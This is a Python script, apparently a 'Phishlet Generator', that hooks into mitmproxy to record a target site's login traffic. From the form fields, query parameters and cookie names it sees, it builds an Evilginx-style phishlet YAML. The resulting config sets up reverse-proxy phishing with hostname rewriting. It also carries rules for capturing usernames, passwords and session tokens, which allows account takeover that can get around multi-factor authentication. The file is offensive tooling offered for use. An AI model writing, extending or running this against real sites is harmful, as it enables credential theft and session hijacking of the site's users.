import argparse
import asyncio
import yaml
from mitmproxy import http
from mitmproxy import ctx
from mitmproxy.options import Options
from mitmproxy.tools.dump import DumpMaster
import re
from termcolor import colored

class PhishletGenerator:
    def __init__(self, target_domain):
        self.target_domain = target_domain.replace('https://', '').replace('http://', '')
        self.subdomains = set()
        self.auth_tokens = set()
        self.credentials_keys = {}
        self.params = {}
        self.force_post_paths = set()
        self.detected_urls = set()
        self.login_path = None
        self.version = '1.0'
        self.author = 'Your Name'
        self.description = 'Phishlet for capturing credentials from ' + self.target_domain
        self.yaml_content = {
            'name': self.target_domain.capitalize(),
            'author': self.author,
            'description': self.description,
            'version': self.version,
            'min_ver': '3.0.0',
            'proxy_hosts': [],
            'sub_filters': [],
            'auth_tokens': [],
            'credentials': {
                'custom': []
            },
            'auth_urls': [],
            'login': {},
            'force_post': []
        }

    def request(self, flow: http.HTTPFlow) -> None:
        """Intercepts and analyzes HTTP/HTTPS requests."""
        host = flow.request.pretty_host
        path = flow.request.path
        status_code = flow.response.status_code if flow.response else "N/A"
        is_redirect = status_code in [301, 302]
        method = flow.request.method

        # Color coding
        status_color = 'green' if status_code == 200 else ('yellow' if is_redirect else 'red')
        method_color = 'cyan' if method == 'GET' else 'magenta'

        # Tree structure for logging
        tree_prefix = '└── ' if path == '/' else '├── '
        if is_redirect:
            redirect_location = flow.response.headers.get("location", "N/A")
            log_line = f"{tree_prefix}[{colored(method, method_color)}] {colored(host + path, 'blue')} {colored(status_code, status_color)} ➜ Redirect to {colored(redirect_location, 'yellow')}"
        else:
            log_line = f"{tree_prefix}[{colored(method, method_color)}] {colored(host + path, 'blue')} {colored(status_code, status_color)}"
        
        print(log_line)

        # Capture details for YAML
        if self.target_domain in host:
            subdomain = host.replace(f".{self.target_domain}", "")
            self.subdomains.add(subdomain)
            if not self.yaml_content['proxy_hosts']:
                self.yaml_content['proxy_hosts'].append({
                    'phish_sub': '*',
                    'orig_sub': '*',
                    'domain': self.target_domain,
                    'session': True,
                    'is_landing': True,
                    'auto_filter': True
                })
                self.yaml_content['sub_filters'].append({
                    'triggers_on': self.target_domain,
                    'orig_sub': '*',
                    'domain': self.target_domain,
                    'search': 'https://{hostname}/',
                    'replace': 'https://{phish_sub}.{domain}/',
                    'mimes': ['text/html', 'application/json', 'application/javascript']
                })
            
            # Capture URL parameters
            if flow.request.query:
                for key, value in flow.request.query.items():
                    self.params[key] = value
            
            # Capture POST parameters
            if flow.request.method == "POST":
                for key, value in flow.request.urlencoded_form.items():
                    self.credentials_keys[key] = value
                if "username" in self.credentials_keys or "email" in self.credentials_keys:
                    self.yaml_content['credentials']['username'] = {
                        'key': 'email' if 'email' in self.credentials_keys else 'username',
                        'search': '(.*)',
                        'type': 'post'
                    }
                if "password" in self.credentials_keys:
                    self.yaml_content['credentials']['password'] = {
                        'key': 'password',
                        'search': '(.*)',
                        'type': 'post'
                    }
                self.yaml_content['credentials']['custom'] = [
                    {'key': key, 'search': '(.*)', 'type': 'post'} 
                    for key in self.credentials_keys 
                    if key not in ['email', 'username', 'password']
                ]
                
                # Detect login path based on common patterns or specific URLs
                if "/auth/login" in flow.request.path or not self.login_path:
                    self.login_path = flow.request.path
                    self.yaml_content['login'] = {
                        'domain': self.target_domain,
                        'path': self.login_path
                    }
            
            # Capture cookies
            if "cookie" in flow.request.headers:
                cookies = flow.request.headers["cookie"]
                self.auth_tokens.update(cookie.split("=")[0].strip() for cookie in cookies.split(";"))
                self.yaml_content['auth_tokens'] = [
                    {
                        'domain': f'{self.target_domain}',
                        'keys': list(self.auth_tokens)
                    }
                ]
        
        # Log the YAML content in real-time with colors
        print(colored(yaml.dump(self.yaml_content, default_flow_style=False, sort_keys=False), 'green'))
    
    def save_yaml(self, filename):
        """Saves the generated phishlet to a YAML file, removing empty sections."""
        # Remove empty sections
        if not self.yaml_content['auth_tokens']:
            del self.yaml_content['auth_tokens']
        if not self.yaml_content['auth_urls']:
            del self.yaml_content['auth_urls']
        if not self.yaml_content['credentials']['custom']:
            del self.yaml_content['credentials']['custom']
        if 'username' not in self.yaml_content['credentials']:
            del self.yaml_content['credentials']['username']
        if 'password' not in self.yaml_content['credentials']:
            del self.yaml_content['credentials']['password']
        if not self.yaml_content['login']:
            del self.yaml_content['login']
        if not self.yaml_content['force_post']:
            del self.yaml_content['force_post']
        
        with open(filename, 'w') as file:
            yaml.dump(self.yaml_content, file, default_flow_style=False, sort_keys=False)
        print(colored(f"Phishlet YAML saved to {filename}", 'cyan'))

def sanitize_filename(url):
    """Sanitizes the filename by removing invalid characters."""
    return re.sub(r'[^\w\-_\. ]', '_', url)

async def run_mitmproxy(target_domain, listen_port):
    options = Options(listen_host='127.0.0.1', listen_port=listen_port)
    m = DumpMaster(options)
    phishlet_generator = PhishletGenerator(target_domain=target_domain)
    m.addons.add(phishlet_generator)
    
    return m, phishlet_generator

def main(target_domain, listen_port):
    loop = asyncio.get_event_loop()
    m, phishlet_generator = loop.run_until_complete(run_mitmproxy(target_domain, listen_port))
    
    try:
        loop.run_until_complete(m.run())
    except KeyboardInterrupt:
        m.shutdown()
    finally:
        # Save YAML file with domain-based filename
        filename = f"{phishlet_generator.target_domain}.yaml"
        phishlet_generator.save_yaml(filename)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Phishlet Generator Script")
    parser.add_argument("-u", "--url", required=True, help="Target domain for generating the phishlet")
    parser.add_argument("--listen-port", default=8080, type=int, help="Port to listen on for mitmproxy")
    
    args = parser.parse_args()

    main(args.url, args.listen_port)
